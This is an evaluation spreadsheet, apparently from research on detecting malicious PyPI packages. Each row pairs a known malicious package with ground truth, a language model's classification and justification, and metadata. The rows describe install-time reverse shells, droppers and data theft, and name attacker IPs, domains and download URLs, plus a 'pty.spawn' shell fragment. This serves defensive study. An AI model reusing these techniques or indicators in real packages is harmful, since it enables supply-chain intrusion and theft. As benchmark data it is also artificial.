Package Name,version,Objective,Details,justification,justification_correctness,objective_capture_correctness,groundtruth,package_size,classification,package_name,classification_id,package_name-2,package_metadata,Location of malicious snippet_groudthruth,suspicious_files_MAMPD,created_at,updated_at,prompt_id,model,dataset_id,experiment_id,Type,Affected Version,Published,Reported,Sample,files match,Injection Component,Obfuscation,Trigger,Conditional,Targeted OS,Source,Comment,Typo Target,Campaign,,
10cent10,999.0.4,['backdoor'],It creates a reverse shell to a hard-coded IP address  giving the attacker full control over an infected machine. 104.248.19.57,"The setup.py script implements a CustomInstall class that creates a reverse shell connection to a remote IP address (104.248.19.57) upon installation. Such behavior is indicative of a package intended for exfiltration and unauthorized access, classifying it as malicious.",Correct,Correct,malicious,1231,malicious,10Cent10-999.0.4.tar.gz,3ec47bb4-706f-497f-acae-77f6464a37fc,10cent10,"{""model_type"": ""gemini"", ""author_name"": ""j0j0"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""10Cent10"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Exfiltration"", ""package_version"": ""999.0.4"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The setup.py script implements a CustomInstall class that creates a reverse shell connection to a remote IP address (104.248.19.57) upon installation. Such behavior is indicative of a package intended for exfiltration and unauthorized access, classifying it as malicious.' suspicious_files=['setup.py']"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/10Cent10-999.0.4_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",setup.py,{setup.py},2025-07-01 19:48:51.105314+00,2025-07-01 19:48:51.105314+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,f1aa9e30-28a9-4d38-8d72-4ca55dabc8b6,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['999.0.4'],2021-09-26T23:38:54,2021-11-18T00:00:00,yes,1,Trojan Horse,,install,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,"pty.spawn(""/bin/sh"")'",,29,,
10cent11,999.0.4,['backdoor'],It creates a reverse shell to a hard-coded IP address  giving the attacker full control over an infected machine. 104.248.19.57,"The package contains a setup script that establishes a socket connection to an external IP address (104.248.19.57) and redirects the input/output streams to that connection, effectively creating a backdoor. This behavior is indicative of malicious software designed for exfiltration or unauthorized access",Correct,correct,malicious,1231,malicious,10Cent11-999.0.4.tar.gz,ff083685-4d8e-4d09-b870-eee4d30798bf,10cent11,"{""model_type"": ""gemini"", ""author_name"": ""j0j0"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""10Cent11"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Exfiltration"", ""package_version"": ""999.0.4"", ""package_homepage"": ""UNKNOWN"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package contains a setup script that establishes a socket connection to an external IP address (104.248.19.57) and redirects the input/output streams to that connection, effectively creating a backdoor. This behavior is indicative of malicious software designed for exfiltration or unauthorized access.' suspicious_files=['setup.py']"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/10Cent11-999.0.4_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",setup.py,{setup.py},2025-07-01 19:28:19.785973+00,2025-07-01 19:28:19.785973+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,40fba763-ac6a-489a-9e12-f77dcaaa781f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['999.0.4'],2021-09-26T23:48:10,2021-11-18T00:00:00,yes,1,Trojan Horse,,install,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,29,,
aadhaarcrypt,1,['data exfiltration'],pon installation  the package collects the system's username  computer's name  IP address  and attempts to upload this information both via HTTP and DNS,"The package AadhaarCrypt-1.0 includes code that collects sensitive information such as hostname and username, encodes it in Base64, and sends it to external domains using HTTP requests. The use of hardcoded domains (sub.deliverycontent.online and www.deliverycontent.online) for data transmission is characteristic of data exfiltration, portraying the package as malicious. The inclusion and functionality of the code indicate a strong risk to user privacy and security, implying it is designed to perform unauthorized operations.",Correct,correct,malicious,3228,malicious,AadhaarCrypt-1.0.tar.gz,cc23bf8a-7f43-4560-8e89-4ee478ba3f1e,aadhaarcrypt,"{""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""AadhaarCrypt"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""UNKNOWN"", ""package_version"": ""1.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/AadhaarCrypt-1.0_dump.json""}",/AadhaarCrypt/__init__.py,{__init__.py},2025-06-28 10:31:35.969607+00,2025-06-28 10:31:35.969607+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,e606afef-fc26-42a7-a54a-e9cf11ac6e10,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0'],,2022-01-24T00:00:00,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://security.snyk.io/vuln/SNYK-PYTHON-AADHAARCRYPT-2359285,named after a legitimateÂ APIÂ project that,aadhaarcrypt,50,,
apple-py-music,1,['data exfiltration'],pon installation  the package collects the systemâ€™s username  computerâ€™s name  IP address  and attempts to upload this information both via HTTP and DNS,"The package contains suspicious code that collects sensitive information such as the hostname, username, and current execution path, which is then encoded and sent to external domains. It also makes repeated HTTP requests and pings to potentially malicious domains.",Correct,Correct,malicious,3248,malicious,apple-py-music-1.0.tar.gz,d3a79a21-0dc1-4670-bc96-70378609c38e,apple-py-music,"{""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""apple-py-music"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""UNKNOWN"", ""package_version"": ""1.0"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/apple-py-music-1.0_dump.json""}",/apple_py_music/__init__.py,{__init__.py},2025-06-28 14:22:52.901256+00,2025-06-28 14:22:52.901256+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,5445105c-4d93-4102-8d11-cb86a86c8150,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['1.0'],,2022-01-24T00:00:00,yes,1,Typosquatting,,install,['unconditional'],['agnostic'],https://blog.sonatype.com/pypi-flooded-with-over-1200-dependency-confusion-packages,named after a Python-based Apple MusicÂ project.,apple-py-music,50,,
aryi,0.1,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The package contains a significant amount of obfuscated code, indicated by the __pyarmor__ function and excessive bytecode, suggesting an intent to hide malicious functionality. Additionally, the general lack of meaningful imports and heavy obfuscation raises red flags about the package's purpose and safety",Correct,incorrect,malicious,61637,malicious,aryi-0.1.tar.gz,b1c22f0d-ba58-456f-b490-3a307d3b9bfa,aryi,"{""model_type"": ""gemini"", ""author_name"": ""sipher"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""aryi"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""aryi"", ""package_version"": ""0.1"", ""package_homepage"": ""https://github.com/siph-er"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The package contains a significant amount of obfuscated code, indicated by the __pyarmor__ function and excessive bytecode, suggesting an intent to hide malicious functionality. Additionally, the general lack of meaningful imports and heavy obfuscation raises red flags about the package's purpose and safety.\"" suspicious_files=['aryi.py']"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""aryi.py""], ""package_formatted_path"": "".temp/plain/aryi-0.1_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/src/aryi.py,{'aryi.py'},2025-07-01 19:41:45.875819+00,2025-07-01 19:41:45.875819+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,8ab824db-d2fb-4a94-9ae8-717cf0d8896a,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.1'],,2021-07-29T00:00:00,yes,1,Trojan Horse,"['base64', 'encoding', 'minification']",runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
aws-login0tool,0.0.14,['dropper'],It does a standard package install  then fetches an .exe from a nondescript domain before attempting to execute the .exe.,"The package contains a custom installation class (`SneakyInstall`) that retrieves and executes an external executable (`normal.exe`) from a potentially harmful URL (`https://tryg.ga/normal.exe`). This behavior is characteristic of malicious software, intended to install and run unauthorized programs on the user's machine.",Correct,correct,malicious,3941,malicious,aws-login0tool-0.0.14.tar.gz,32e69c56-8f55-4904-96e4-3131d54e1b03,aws-login0tool,"{""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 10, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.14"", ""package_homepage"": ""https://example.com"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.14_dump.json""}",setup.py,{setup.py},2025-06-28 10:49:56.038825+00,2025-06-28 10:49:56.038825+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,c5084bba-e536-4790-845b-88d93feb5838,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.10', '0.0.11', '0.0.12', '0.0.13', '0.0.14', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['windows'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,aws-login-tool,86,,
aws-login0tool,0.0.4,['dropper'],It does a standard package install  then fetches an .exe from a nondescript domain before attempting to execute the .exe.,"The `setup.py` script attempts to download and execute a file from an external URL (https://tryg.ga/syswin32.exe). This behavior is characteristic of malicious software that can install unwanted or harmful applications on the user's system. The presence of this functionality, combined with the absence of any legitimate utility in the other files, suggests that this package is designed for malicious purposes.",Correct,Correct,malicious,3933,malicious,aws-login0tool-0.0.4.tar.gz,252971cf-975e-4311-aa92-c6c29527ee9a,aws-login0tool,"{""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.4"", ""package_homepage"": ""https://example.com"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.4_dump.json""}",setup.py,{setup.py},2025-06-28 10:52:42.63217+00,2025-06-28 10:52:42.63217+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,fdef70e0-ffb7-418c-9781-92ee98e1a0d4,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.10', '0.0.11', '0.0.12', '0.0.13', '0.0.14', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['windows'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,aws-login-tool,86,,
aws-login0tool,0.0.8,['dropper'],It does a standard package install  then fetches an .exe from a nondescript domain before attempting to execute the .exe.,"The setup.py script contains code that downloads and executes an external executable file ('syswin32.exe') from an unknown URL, which is a common behavior exhibited by malicious packages. This poses a serious security risk as it could potentially lead to the installation of harmful software on the user's system.",Correct,Correct,malicious,3929,malicious,aws-login0tool-0.0.8.tar.gz,e914e01d-518b-46cc-b2ff-509655366865,aws-login0tool,"{""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.8"", ""package_homepage"": ""https://example.com"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.8_dump.json""}",setup.py,{setup.py},2025-06-28 10:57:24.025669+00,2025-06-28 10:57:24.025669+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,02425250-b7d8-4037-8a62-85a5d52d427c,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.10', '0.0.11', '0.0.12', '0.0.13', '0.0.14', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['windows'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,aws-login-tool,86,,
aws-login0tool,0.0.13,['dropper'],It does a standard package install  then fetches an .exe from a nondescript domain before attempting to execute the .exe.,"The setup.py file contains a class SneakyInstall that attempts to download and execute a file from the internet during installation, which is indicative of malicious behavior. This is a common tactic used by malware to install unwanted or harmful software on a user's system.",Correct,Correct,malicious,3947,malicious,aws-login0tool-0.0.13.tar.gz,8d0ce13b-03c6-42d9-bbf2-23d750f61efc,aws-login0tool,"{""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 10, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.13"", ""package_homepage"": ""https://example.com"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.13_dump.json""}",setup.py,{setup.py},2025-06-28 10:59:37.471131+00,2025-06-28 10:59:37.471131+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,081be62b-0924-4fdd-b5c5-c0db15a2479a,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.10', '0.0.11', '0.0.12', '0.0.13', '0.0.14', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['windows'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,aws-login-tool,86,,
aws-login0tool,0.0.3,['dropper'],It does a standard package install  then fetches an .exe from a nondescript domain before attempting to execute the .exe.,"The package contains code that attempts to download and execute a file from an external URL (https://tryg.ga/syswin32.exe) using a subprocess. This behavior aligns with typical characteristics of malicious software, as it can lead to the installation of unwanted or harmful programs. The use of `urllib.request.urlretrieve` combined with executing the downloaded file is suspicious and typical of malware practices.",Correct,Correct,malicious,3933,malicious,aws-login0tool-0.0.3.tar.gz,11330870-dc24-4394-9bbc-7e94ab9a8215,aws-login0tool,"{""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.3"", ""package_homepage"": ""https://example.com"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.3_dump.json""}",setup.py,{setup.py},2025-06-28 13:38:16.801226+00,2025-06-28 13:38:16.801226+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,e4638b29-c167-4304-9c6f-28dc58dff03d,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.10', '0.0.11', '0.0.12', '0.0.13', '0.0.14', '0.0.2', '0.0.3', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9']",,2021-12-13T06:54:00,yes,1,Typosquatting,,install,['unconditional'],['windows'],https://www.bleepingcomputer.com/news/security/malicious-pypi-packages-with-over-10-000-downloads-taken-down/,,aws-login-tool,86,,
